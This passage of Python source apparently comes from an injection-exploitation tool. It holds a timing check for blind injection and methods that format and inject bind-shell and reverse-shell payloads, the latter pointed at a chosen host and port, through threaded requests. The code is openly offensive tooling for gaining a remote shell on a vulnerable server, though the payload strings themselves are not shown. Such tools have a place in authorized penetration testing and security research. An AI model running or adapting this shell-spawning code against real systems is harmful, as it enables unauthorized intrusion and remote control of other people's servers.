        # Get current average timing for render() HTTP requests
        average = int(sum(self.render_req_tm) / len(self.render_req_tm))
        dev = [x - average for x in self.render_req_tm]
        varydev = max(dev) + abs(min(dev))
        # Set delay to 2 second over the average timing
        delay = self.tm_delay if not self.get('blind_test', False) else self.tm_verify_delay
        if not self.tm_varied and varydev > delay:
            self.tm_varied = True
            log.log(29, "Blind injection timing varies too much. Increase the timing to avoid false positives.")
        return average + delay

    def bind_shell(self, port, shell="/bin/sh"):
        action = self.actions.get('bind_shell', {})
        payload_actions = action.get('bind_shell')
        call_name = action.get('call', 'inject')
        # Skip if something is missing or call function is not set
        if not action or not isinstance(payload_actions, list) or not call_name or not hasattr(self, call_name):
            return
        for payload_action in payload_actions:
            execution_code = payload_action.format(port=port, shell=shell)
            reqthread = threading.Thread(target=getattr(self, call_name), args=(execution_code,))
            reqthread.start()
            yield reqthread

    def reverse_shell(self, host, port, shell="/bin/sh"):
        action = self.actions.get('reverse_shell', {})
        payload_actions = action.get('reverse_shell')
        call_name = action.get('call', 'inject')
        # Skip if something is missing or call function is not set
        if not action or not isinstance(payload_actions, list) or not call_name or not hasattr(self, call_name):
            return
        for payload_action in payload_actions:
            execution_code = payload_action.format(port=port, shell=shell, host=host)
            reqthread = threading.Thread(target=getattr(self, call_name), args=(execution_code,))
            reqthread.start()

    def update_actions(self, actions):
        # Recursively update actions on the instance
        self.actions = _recursive_update(self.actions, actions)

    def set_actions(self, actions):
        # Set actions on the instance
        self.actions = actions

    def set_contexts(self, contexts):
        # Update contexts on the instance
        self.contexts = contexts
